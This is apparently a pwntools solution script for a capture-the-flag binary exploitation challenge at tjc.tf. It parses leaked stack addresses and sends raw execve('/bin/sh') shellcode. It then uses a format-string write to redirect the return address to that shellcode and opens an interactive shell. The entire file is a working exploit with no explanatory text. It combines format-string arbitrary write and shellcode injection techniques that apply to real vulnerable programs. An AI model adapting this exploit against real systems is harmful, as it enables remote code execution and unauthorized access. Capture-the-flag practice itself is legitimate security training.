#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

gdb_script = '''
    b *main+0x3b8
    c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)

    else:
        r = remote("tjc.tf", 31363)

    return r


def main():
    r = conn()

    OFFSET = 12

    # get the leaks
    leaks = r.recvline().decode().strip().split(",")

    INPUT_BUFF = leaks[0]
    BALANCE = leaks[1]

    log.info(f"input_buff = {INPUT_BUFF}, balance = {BALANCE}")

    # calculate eip address
    EIP = int(INPUT_BUFF, 16) + 0x418

    
    # calculate shellcode address
    SHELLCODE_ADDR = int(INPUT_BUFF, 16) + 1000
    SHELLCODE = b"A"*1000 + b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

    #asm(shellcraft.execve("/bin/sh\0"))
    r.sendline(SHELLCODE)
    # write the shellcode to the EIP address
    r.sendline(b"withdraw")
    payload = fmtstr_payload(OFFSET, {EIP: p64(SHELLCODE_ADDR)},write_size="short")
    r.sendline(payload)
    r.sendline(b"exit")

    r.interactive()


if __name__ == "__main__":
    main()
